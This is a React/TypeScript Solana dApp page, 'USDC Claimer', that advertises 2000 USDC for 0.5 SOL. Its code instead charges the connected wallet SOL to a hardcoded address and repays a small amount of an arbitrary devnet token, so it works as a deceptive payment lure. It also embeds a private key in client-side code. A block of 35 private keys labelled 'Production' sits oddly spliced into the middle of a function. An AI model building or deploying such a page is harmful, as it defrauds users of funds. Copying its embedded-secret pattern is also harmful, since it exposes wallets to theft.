/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "3BcczRCrtSSwZL14aVi37vCyvGY5dCNbLWNTMJPvMJLchwJ8b175PkXwpmRM8voT8tgygYT52yyAVHgAKHkM86KQ"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "djby6pG6eBQnwEbyqYMh6pG34ck8FoUKGQ8NYDGRHQmsc1iZr7LFY9N9qut7xLA7WC8u8mbnE8BjajpLjo2EDBw",
  "key1": "R35HTR14iNMhathCs26f4VBXAP1jwPv1HdhYTMJwdRPgP1JVxsbHEQj6AsuogoT5wLeAg55WHeswXUj9YXJ5d1H",
  "key2": "5nJgLwCQ9LiEfoH6RSX97bEoRUpfP4KFRgiWdb1fFirPS4oZWiS4i7jWfVBDdSGxSjrwycg2VEykK343tjbegKC9",
  "key3": "SyQL9KpbCyvtk4nybxJDCj58hfF5QSPkp1VHcqs7JcVizGvCcpHnGKUy2CwUnioUS944aJPSnnFTVjvPctp8a96",
  "key4": "4Yf68sU5Y6VH6wxxmKQVrZ2qBmretEYeoTfGWzLBa62BH4px1H3E6mWGAj9ad5fSULecHafnJ8N4dHuu45rxV4FV",
  "key5": "3AUaaTPoGGupNgLcXQBV8HpYEdDtc8R38fZgFswW4EiXQ3y7NQUCP3xAw4LbtLj9feMNxAuyJmtEsk3APAxFzJiu",
  "key6": "RypHee9aiTNQ6J7GfFm4fQXPqcsmubBZiEMu4u1LPDNEn5QuNJUxHmAxsvCmTnDemtgUZWzCGQqvdTP653nJkn7",
  "key7": "4DsS8jAL79TEznUgM7YDMsQ2eYpGahb5tDYytw3WHVCA22TGMpiBXPWCJKCCGBkLGARkAwhkavrdpARQoZgv2qW9",
  "key8": "2A8PgrKDw1tAEFPg7hjSomBiBrisrPVsHpYD2rQvvMcDhPMk6ecspQVKoSk9tbomW85CqaQWxE3cacQqxp1rMq4G",
  "key9": "BvoDybUr5W95eFJFoTsUAgQefamsrYKZMQnorq7dqubWwsdQDZsnsBpTfiYyp7FX4eyup66t6sCxLfmPuDsRmGk",
  "key10": "3EvB21KbuC15KvmvsBV83twHvhFGkQtvqrE2ytBqhYvcxtJoRAbCqyv55va2M2oPS5SnL9G7k4DPoewzycVbN5r",
  "key11": "2YDVAWJrnXdUE2e2VPNnXv8NQDEN8o1Z8kj5UDRt2oozhhqTJspgv4AXwwZVfbhSiScJHigpoJPRfAGfRAoLQ6HS",
  "key12": "46saC6FyRsdQaZVfUTQzc6sAtFFqyFmNK21WqUUDVRTZjDH4opp4gkz4WJoLuvz2WRUjS9hLEppCJQJH3L2FJJiz",
  "key13": "3TCTFvFwrjwtraARQv16QGkH4uaQDkKrwtbMdqDAHXrNcm2tQJJFoAjUAY63YA6EG2cpC5rMNDmcNUYEvA6QzKiS",
  "key14": "4YoqMQrnQjtxQ8ZJwwWL1VeoW4c7gQE1aAKJGS4uQRLU5Eixi2y77q9UGEtZoWrwRe877xv16bN8ZWpfXgLduSzk",
  "key15": "oDyGaQZ73KgDhdqJMSQ1hXAtEJ8EBQmqG4fY8GKWKAWV9wGQUwv2w9HCKiNRpYPnkC69og2kP8oHXpvaCy3cL1W",
  "key16": "5krhF3Dm81xoWSfU3MSJm5DpwNLYULftEH64h6hFDjkGNpRbDD2ZAdJFFeiHunvGrxTskJXDUQdiq9s5rc7uwqAQ",
  "key17": "4hQuWj3gMY7PtQEHiPXqW9KSqfcFftGSqakZR9P7BRm1JaPQ4DAaDcJAKNq7wt2trnaDwCGrRQuZ6YUkdKJ4pRHE",
  "key18": "5Pc1K9ioW3SJ1SndDbZPqmEZxXGSHuxKSUAo7JjZ75qFYmxYJMzCcTqAp2NbBcHMXkCw8BBZCncjm289UocKvkWM",
  "key19": "63ori9GHac2ha414QehwY7bqvfiH6ptBhkzLrYBXx3FaHbQ73nLaj1r6h61fbGhNCH4zkP3XJJRG6ahWrkkEhrs3",
  "key20": "2jsLiNNJfquBDFBNpyEFPHaibUSAA8pfvewdJeQgvpBzAQ7xupTN2WA7VGWRXpPBfNS7geCVjAaPKuvE5ticPHeS",
  "key21": "5ihDhsZbj8ozCYW9w48BJwERk5HuxvS4ZQgR7eYHu44NS7yK5N9QkX2gZ65rSjqwMpUV78zYTQvDdLjyVoeASjho",
  "key22": "4hrXd3oCy5jNzoF5SBiEHZbmwffsZBFR5Wx6Ce8nz6bjBNHTtm383xHe9vxxKMpXi9KPznzQZJjmKXgU8p9j5pan",
  "key23": "2aKWGAfjnfTAjZ8SwPaSeEmTuFntdYkmRYScQUoKDWJibg6e9NrMtVJyFBeWw54VJTvsQkfYhtbbNqHaF5pxHaHC",
  "key24": "47eLFGSRr6wUoH9LcsstMgBTNPYLWRpfUjV66N6bWk9H611ZHUwreuypZeSXEa9T1TELPvDX6CBYfPAu64cSdjvW",
  "key25": "2YWugwwCEEQMHhiYCTqkEqCzVhechjeTfobMZ3EEsxpHkN9rECmKxpX5JaTX1z2JszYakzxDhqTX7twkwZdbc72M",
  "key26": "3QyvLKbLo3cJdSrYZFZw9d7QQmvn2W6hEvYjGWuHgrbRM7pAV8wB6q7PcCtKbP3TbAqarScEJZ5CfwEj4Hha6MAf",
  "key27": "5PDS9avPHT2nnWddMQxNseEHRu1kyRYAyJMJxDvvtLCtKc94Qu6HNMCAKV5FvawKgdW9aBVCcyWfSFTn6xiFPNik",
  "key28": "5KBFnmszQ22LASBTnYVGoZdRtjvD3MGvAZ3hWLja3y2Ny8xDTXgJh2ZoJSN91UuZcBgGqHYuPdwehfbQg1HPVDUy",
  "key29": "65eHC33SGU41Kfo36tKCcKN9inMMc67rEgELfYaz6hspRgu5HkxViPt44gnpwo9okHdtPeZDMW9S4nd5L7DqzfQb",
  "key30": "2KNUk9X3AWG4pAT4FASKMp1riZDtpvRe8zu6nfmDQH1F3qXwMDMJGDCUBr2tdnKByc9g8a1D2AcVCGVoULKjrCNo",
  "key31": "2v5fp3VcJ6CaJz55RQi4fLqCcDDS79SRMHCdAcnJHYTArHFHBm1SXCvSjkU4QCRJSMwzAFkajJFUoL1f8NQ3777x",
  "key32": "28b4atz9h2UxGpySmwCfdN5d5EUsnsmnd6SPQHhkGwbgcnJ8fYN5ApmNLMhZ4w3WnwVLNyovuiQUCnMCzuu8w2AR",
  "key33": "3ZqznbDSVhv2hS431pVkGxEzgbmCw493tVMMXmRzcu4MzRGjT9Xz1f4bz8nnvbqvvjYzwh1DmqQBkiex3EAWgRYy",
  "key34": "UEMtQr7BxbiFAJMf5xivvvALzng7yhyUkcAPoRKwgbNAfCZqRSFymU8G4PbMyzi1tWfXxVaN795fXv3FbzUc2AY"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
